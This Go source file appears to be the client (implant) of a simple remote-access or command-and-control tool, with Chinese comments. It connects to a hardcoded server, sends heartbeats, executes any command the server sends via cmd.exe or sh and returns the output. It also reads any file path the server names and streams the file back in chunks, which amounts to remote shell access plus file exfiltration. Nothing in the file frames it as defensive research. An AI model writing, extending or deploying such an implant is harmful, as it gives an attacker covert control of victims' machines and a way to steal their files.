package main

import (
	"bytes"
	"eiradinner/internal/structs"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"time"

	"golang.org/x/text/encoding/simplifiedchinese"

	"golang.org/x/text/transform"
)

//这个部分是client的模块主要分为几个执行步骤

var target_ip string
var target_port string
var systemtype string

func main() {
	systemtype = "windows"
	target_ip = "127.0.0.1"
	target_port = "8888"

	//连接对应的服务
	conn, _ := net.Dial("tcp", fmt.Sprintf("%s:%s", target_ip, target_port))
	// 心跳包
	go sent_heartbeat(conn)
	// buffer := make([]byte, 1024)
	go receiveMessage(conn)
	select {}
}

func sent_heartbeat(conn net.Conn) { //client 发送心跳包给server
	for {
		hb := structs.Hartbit{
			MessageType: 0,
			Timestamp:   time.Now().Format(time.RFC3339),
		}
		data, _ := json.Marshal(hb)
		conn.Write(data)
		time.Sleep(60 * time.Second) // 每分钟发送一次心跳包
	}
}

func receiveMessage(conn net.Conn) {
	buffer := make([]byte, 1024)
	for {
		n, err := conn.Read(buffer)
		if err != nil {
			fmt.Println("读取数据时出错:", err)
			return
		}
		if n > 0 {
			handleMesseage(conn, buffer[:n]) // 执行相应的命令
		}
	}
}

func handleMesseage(conn net.Conn, data []byte) {
	var message structs.Hartbit
	err := json.Unmarshal(data, &message)
	if err != nil {
		fmt.Println("解码数据时出错:", err)
		return
	}
	// 根据 messageType 执行相应的操作
	switch message.MessageType {
	case 1:
		handlercommandexec(conn, data)
	case 5:
		sendfiletoserver(conn, data) //5 为firename  client 向server 发送文件
	case 4:
		resivefilefromserver(conn, data) //2 upload client 接收 server 发送的文件
	}

}

func handlercommandexec(conn net.Conn, data []byte) {
	var commandmessage structs.ClientCommand
	json.Unmarshal(data, &commandmessage)
	command := commandmessage.Command
	var output []byte
	var err error
	if systemtype == "windows" {
		cmd := exec.Command("cmd.exe", "/C", command)
		output, err = cmd.CombinedOutput()
		if err != nil {
			fmt.Println("执行命令出错")
			fmt.Println(err.Error())
		}
	} else if systemtype == "linux" {
		cmd := exec.Command("sh", "-c", command)
		output, err = cmd.CombinedOutput()
		if err != nil {
			fmt.Println("执行命令出错")
			fmt.Println(err.Error())
		}

	}
	re := structs.ClientResponse{
		MessageType: 3,
		Timestamp:   time.Now().Format(time.RFC3339),
		Content:     output,
	}
	respondmessage, _ := json.Marshal(re)
	conn.Write(respondmessage)

}

func sendfiletoserver(conn net.Conn, data []byte) { //向server 端传输文件
	var fileessage structs.FileNameMessage
	json.Unmarshal(data, &fileessage)
	filepath := fileessage.FilePath
	file, err := os.Open(filepath)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	// 获取文件信息
	fileInfo, err := file.Stat()
	print(fileInfo)
	if err != nil {
		fmt.Println("Error getting file info:", err)
		return
	}
	const chunkSize = 1024 * 1024 // 定义chunk大小为1M
	log.Println("文件大小为", fileInfo.Size())
	totalChunks := int(fileInfo.Size()+chunkSize-1) / chunkSize // chunkSize
	fmt.Print("开始分块传输")
	for i := 0; i < totalChunks; i++ {
		// 读取分块内容
		chunkContent := make([]byte, chunkSize)
		n, err := file.Read(chunkContent)
		fmt.Printf("读取数据为%d\n", n)
		if err != nil && err != io.EOF {
			fmt.Println("Error reading file:", err)
			return
		}
		chunkContent = chunkContent[:n]
		filesendmessage := structs.FileTransferMessage{
			MessageType:  4,
			Timestamp:    time.Now().Format(time.RFC3339),
			FilePath:     filepath,
			FileSize:     fileInfo.Size(),
			ChunkNumber:  i + 1,
			TotalChunks:  totalChunks,
			ChunkContent: chunkContent,
		}
		messageBytes, err := json.Marshal(filesendmessage)
		fmt.Print(string(messageBytes))
		if err != nil {
			fmt.Println("Error marshaling message:", err)
			return
		}
		_, err = conn.Write(messageBytes)
		if err != nil {
			fmt.Println("Error sending message:", err)
			return
		}

		fmt.Printf("Sent chunk %d of %d\n", i+1, totalChunks)
	}

	fmt.Println("File sent successfully")
}

func resivefilefromserver(conn net.Conn, data []byte) {

}

func convertToUTF8(data []byte) (string, error) {
	decoder := simplifiedchinese.GBK.NewDecoder() // 使用 GBK 编码
	utf8Data, err := ioutil.ReadAll(transform.NewReader(bytes.NewReader(data), decoder))
	if err != nil {
		return "", err
	}
	return string(utf8Data), nil
}
